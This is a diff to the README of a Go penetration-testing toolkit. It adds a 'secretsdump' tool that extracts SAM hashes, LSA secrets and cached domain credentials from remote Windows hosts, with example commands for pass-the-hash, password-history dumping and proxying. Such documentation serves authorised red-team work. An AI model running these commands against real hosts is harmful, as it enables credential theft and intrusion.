@@ -6,6 +6,7 @@ A collection of Go-based network security tools for penetration testing and red 
 
 | Tool | Description |
 |------|-------------|
+| **secretsdump** | Extract SAM hashes, LSA secrets, and cached domain credentials from remote hosts |
 | **smbexec** | Remote command execution via the Windows Service Control Manager (SCM) over SMB |
 
 ## Building
@@ -29,6 +30,41 @@ GOOS=windows GOARCH=amd64 make smbexec
 Binaries are placed in `build/`.
 
 ## Usage
+
+### secretsdump
+
+Extract password hashes from a remote Windows host via the remote registry and SMB.
+
+```bash
+# Dump SAM hashes and LSA secrets
+secretsdump 'domain/user:password@target'
+
+# Pass-the-hash
+secretsdump -hashes 'aad3b435b51404ee:e19ccf75ee54e06b' 'domain/user@target'
+
+# Save output to files
+secretsdump -outputfile dump 'user:password@target'
+
+# Include password history
+secretsdump -history 'user:password@target'
+
+# Via SOCKS proxy
+secretsdump -proxy socks5://127.0.0.1:1080 'user:password@target'
+```
+
+**Options:**
+
+```
+  -share string        Share for temp file staging (default "ADMIN$")
+  -outputfile string   Write output to file (base name, extensions added)
+  -history             Dump password history
+  -port int            Destination port (default 445)
+  -target-ip string    IP of the target (if different from hostname)
+  -hashes string       NTLM hash, LMHASH:NTHASH format
+  -no-pass             Don't prompt for password
+  -proxy string        SOCKS proxy (socks5://host:port)
+  -debug               Enable debug output
+```
 
 ### smbexec
 
@@ -70,9 +106,11 @@ smbexec -share ADMIN$ 'user:password@target'
 ```
 gonetkit/
 ├── cmd/
+│   ├── secretsdump/    # SAM/LSA hash extraction
 │   └── smbexec/        # Remote execution via SCM
 ├── internal/
 │   ├── credentials/    # Shared auth & target parsing
+│   ├── crypto/         # DES/AES/RC4 helpers for hash decryption
 │   └── util/           # Shared helpers
 ├── Makefile
 └── go.mod
